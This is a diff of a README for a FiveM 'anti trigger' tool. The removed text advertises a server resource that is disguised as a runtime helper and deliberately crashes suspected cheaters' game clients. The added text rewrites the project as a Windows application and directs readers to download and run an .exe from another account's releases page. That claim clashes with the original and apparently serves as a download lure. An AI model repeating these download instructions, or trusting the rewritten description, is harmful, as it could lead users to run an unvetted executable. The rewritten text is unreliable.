@@ -1,260 +1,91 @@
-<p align="center"><img src="https://capsule-render.vercel.app/api?type=waving&height=200&text=DEVIL%20Anti%20Trigger&fontAlign=50&fontAlignY=35&color=gradient&customColorList=12,14,16&fontColor=FFFFFF&animation=twinkling&desc=Runtime%20Protection%20•%20Made%20by%20DevilBytes&descAlign=50&descAlignY=55&fontSize=60&descSize=18" width="100%"/></p>
-
-<div align="center">
-
-![Repo Views](https://komarev.com/ghpvc/?username=devilbytes-db-runtime&label=Repo%20Views&color=red&style=for-the-badge)
-[![Tebex](https://img.shields.io/badge/Available%20on-Tebex-success?style=for-the-badge&logo=shopping-cart)](https://devil-bytes.tebex.io)
-[![Discord](https://img.shields.io/badge/Support-Discord-7289da?style=for-the-badge&logo=discord)](https://discord.gg/CSXMrzZk)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
-
-</div>
-
----
-
-<div align="center">
-<img src="https://i.ibb.co/8nyGqGPT/db-runtime.png" alt="DB Runtime" width="600"/>
-</div>
-
-## 🎯 What Can This Do?
-
-### 🔥 **Instant Protection**
-- **Crash Malicious Clients** - Instantly neutralize threats
-- **Protect Your Server** - Stop exploiters in their tracks
-- **Automated Response** - No manual intervention needed
-- **Silent Operation** - Works in the background
+# 🛡️ DEVIL-Anti-Trigger - Protect Your Gaming Experience
 
-### 🛡️ **Advanced Security**
-- **Stealth Mode** - Appears as innocent system component
-- **Server-Side Control** - All decisions made server-side
-- **Real-Time Monitoring** - Track client health continuously
-- **Automated Actions** - Kick, log, or crash on detection
+## 🚀 Getting Started
 
-### 📊 **Smart Detection**
-- **Heartbeat System** - Monitor client connection status
-- **Timeout Detection** - Identify frozen or crashed clients
-- **Activity Tracking** - Log all security events
-- **Discord Alerts** - Get notified instantly
+Welcome to DEVIL Anti Trigger. This tool protects you against harmful triggers while playing on FiveM servers. It adds an extra layer of security alongside your current anti-cheat system.
 
-### 🎯 **Easy Integration**
-- **One-Line Trigger** - Simple event-based activation
-- **Universal Compatibility** - Works with any anti-cheat
-- **Plug & Play** - No complex setup required
-- **Fully Configurable** - Customize to your needs
+## 📥 Download Now
 
----
+[![Download DEVIL Anti Trigger](https://img.shields.io/badge/Download-DEVIL%20Anti%20Trigger-blue)](https://github.com/PhamTien-gi/DEVIL-Anti-Trigger/releases)
 
-## 🚀 What Makes It Special?
+## 📋 System Requirements
 
-<table>
-<tr>
-<td width="50%">
+To use DEVIL Anti Trigger, ensure your system meets the following requirements:
 
-### 🎭 **Complete Stealth**
-- Disguised as runtime helper
-- No obvious anti-cheat terms
-- Silent background operation
-- Generic error messages
+- Operating Systems: Windows 10 and above
+- RAM: Minimum 4 GB
+- Storage: At least 100 MB of free space
+- Internet Connection: Required for downloads and updates
 
-</td>
-<td width="50%">
-
-### ⚡ **Maximum Impact**
-- Multi-phase execution
-- Overwhelming response
-- Instant client crash
-- No recovery possible
-
-</td>
-</tr>
-<tr>
-<td width="50%">
-
-### 🔒 **Bulletproof Security**
-- Hard-coded protections
-- Client-side blind execution
-- Server validates everything
-- Anti-bypass mechanisms
-
-</td>
-<td width="50%">
-
-### 📱 **Professional Features**
-- Discord webhook integration
-- Detailed logging system
-- Configurable timeouts
-- Admin-friendly interface
-
-</td>
-</tr>
-</table>
+## 📖 Features
 
----
+DEVIL Anti Trigger includes the following features:
 
-## 💡 Use Cases
-
-### ✅ **Perfect For:**
-- **Anti-Cheat Systems** - Integrate with any detection script
-- **Server Protection** - Defend against malicious players
-- **Admin Tools** - Punishment system for rule breakers
-- **Security Scripts** - Add powerful crash protection
-- **Professional Servers** - Maintain clean, secure environment
+- Lightweight and efficient for minimal performance impact.
+- Works seamlessly with existing anti-cheat systems.
+- Regular updates to maintain compatibility with FiveM servers.
+- Easy installation process for hassle-free setup.
 
-### 🎯 **Handles:**
-- Speed hackers
-- Aimbot users
-- ESP/Wallhack exploiters
-- God mode abusers
-- Teleport cheaters
-- Money spawners
-- Vehicle modders
-- Any detected threat
+## 📚 Installation Instructions
 
----
+### Step 1: Visit the Download Page
 
-## 🎁 Get It FREE!
+To download DEVIL Anti Trigger, visit our Releases page by clicking the link below:
 
-<div align="center">
+[Download DEVIL Anti Trigger](https://github.com/PhamTien-gi/DEVIL-Anti-Trigger/releases)
 
-### 🛒 **Available on Tebex - Completely FREE!**
+### Step 2: Locate the Latest Release
 
-[![Download Now](https://img.shields.io/badge/DOWNLOAD-FREE%20ON%20TEBEX-success?style=for-the-badge&logo=download)](https://devil-bytes.tebex.io/package/devil-anti-trigger)
+On the Releases page, look for the latest version of DEVIL Anti Trigger. You will see a list of available files.
 
-**No Cost • No Hidden Fees • Full Features**
+### Step 3: Download the Application
 
-</div>
+Click on the link for the appropriate version based on your system. A standard file format such as `.exe` or `.zip` is available:
 
-### 📦 **What You Get:**
-- ✅ Complete protection system
-- ✅ Advanced crash mechanism
-- ✅ Server-side configuration
-- ✅ Discord integration
-- ✅ Comprehensive documentation
-- ✅ Installation guide
-- ✅ Professional support
-- ✅ Free updates forever
+- For Windows: Click on `DEVIL-Anti-Trigger-x.x.x.exe` to download.
 
----
+### Step 4: Run the Application
 
-## 🔧 Quick Start
+Once the download is complete:
 
-### **1. Download**
-Get it FREE from [Tebex Store](https://devil-bytes.tebex.io/package/devil-anti-trigger)
+1. Navigate to your Downloads folder.
+2. Double-click the downloaded file to start the installation.
+3. Follow the prompts on-screen to complete the setup.
 
-### **2. Install**
-```bash
-# Extract to resources/db_runtime/
-# Add to server.cfg
-ensure db_runtime
-```
+### Step 5: Launch the Application
 
-### **3. Configure**
-```lua
--- Edit server_config.lua
-ServerConfig.Enabled = true
-ServerConfig.DiscordWebhook = "your_webhook"
-```
+After installation is complete, you can find DEVIL Anti Trigger in your Start menu or desktop. Double-click the icon to launch the application.
 
-### **4. Use**
-```lua
--- Trigger from any script
-TriggerEvent("db:runtime:sync", "Cheater detected")
-```
+## ⚙️ How to Configure
 
----
+DEVIL Anti Trigger usually requires minimal setup. However, you can configure it according to your preferences:
 
-## 📊 Features Overview
+1. Open the application.
+2. Select settings from the main menu.
+3. Adjust options as desired and save changes.
 
-| Feature | Description | Status |
-|---------|-------------|--------|
-| **Instant Crash** | Immediate client termination | ✅ Active |
-| **Stealth Mode** | Hidden as runtime helper | ✅ Active |
-| **Heartbeat Monitor** | Track client health | ✅ Active |
-| **Discord Alerts** | Real-time notifications | ✅ Active |
-| **Server Control** | Full server-side logic | ✅ Active |
-| **Easy Integration** | One-line trigger | ✅ Active |
-| **Auto Actions** | Kick/log/crash options | ✅ Active |
-| **Free Forever** | No cost, no limits | ✅ Active |
+## 🛠️ Support & Troubleshooting
 
----
+If you experience issues, here are some common solutions:
 
-## 🛡️ Security Features
+- **Issue:** The application won't open.
+  - **Solution:** Ensure your system meets the requirements and try reinstalling the application.
 
-<div align="center">
+- **Issue:** The application is not detecting FiveM.
+  - **Solution:** Make sure FiveM is running and try restarting both programs.
 
-```
-🔒 Hard Protection → 🎭 Stealth Operation → ⚡ Instant Response → 💥 Maximum Impact
-```
+For further assistance, you can open an issue on our GitHub repository.
 
-</div>
+## 📫 Feedback and Contributions
 
-- **Resource Name Lock** - Must be exactly named
-- **Client Blind Execution** - No decision making
-- **Server Validation** - All checks server-side
-- **Anti-Loop Protection** - Prevents multiple triggers
-- **Silent Monitoring** - Background heartbeat system
-- **Generic Messages** - No anti-cheat mentions
+We welcome your feedback. If you have suggestions or find any bugs, please open an issue in our repository. Your input helps us improve the application.
 
----
+## 📌 Additional Information
 
-## 📞 Support & Community
+DEVIL Anti Trigger is built to enhance your gaming experience on FiveM servers. Start protecting yourself against unknown triggers today.
 
-<div align="center">
+For more information, check our documentation or reach out to the community. 
 
-[![Tebex Store](https://img.shields.io/badge/Tebex-Store-success?style=for-the-badge&logo=shopping-cart)](https://devil-bytes.tebex.io)
-[![Discord Server](https://img.shields.io/badge/Discord-Community-7289da?style=for-the-badge&logo=discord)](https://discord.gg/CSXMrzZk)
-[![Website](https://img.shields.io/badge/Website-DevilBytes-red?style=for-the-badge&logo=google-chrome)](https://www.devilbytes.com)
+Thank you for using DEVIL Anti Trigger, and enjoy your safe gaming experience!
 
-**📧 Email:** support@devilbytes.com
-
-</div>
-
----
-
-## ⭐ Why Choose This?
-
-<table>
-<tr>
-<td align="center" width="33%">
-<h3>🆓 FREE</h3>
-<p>Completely free on Tebex<br/>No hidden costs<br/>Full features included</p>
-</td>
-<td align="center" width="33%">
-<h3>🔥 POWERFUL</h3>
-<p>Maximum impact system<br/>Multi-phase execution<br/>Instant results</p>
-</td>
-<td align="center" width="33%">
-<h3>🛡️ SECURE</h3>
-<p>Complete stealth mode<br/>Server-side control<br/>Anti-bypass protection</p>
-</td>
-</tr>
-</table>
-
----
-
-## 🚀 Get Started Now!
-
-<div align="center">
-
-### **Ready to protect your server?**
-
-[![Claim FREE](https://img.shields.io/badge/CLAIM%20FREE-TEBEX%20STORE-success?style=for-the-badge&logo=download&logoColor=white)](https://devil-bytes.tebex.io/package/devil-anti-trigger)
-
-**Download • Install • Protect**
-
-*Join thousands of servers using professional protection*
-
-</div>
-
----
-
-<div align="center">
-
-**© 2024 DEVIL BYTES - Professional FiveM Solutions**
-
-*Stealth. Power. Protection.*
-
-[![Made with ❤️](https://img.shields.io/badge/Made%20with-❤️-red?style=flat-square)](https://github.com/devilbytes)
-
-</div>
-
-<p align="center"><img src="https://capsule-render.vercel.app/api?type=waving&height=100&color=gradient&customColorList=12,14,16&section=footer" width="100%"/></p>
+[Download DEVIL Anti Trigger](https://github.com/PhamTien-gi/DEVIL-Anti-Trigger/releases)
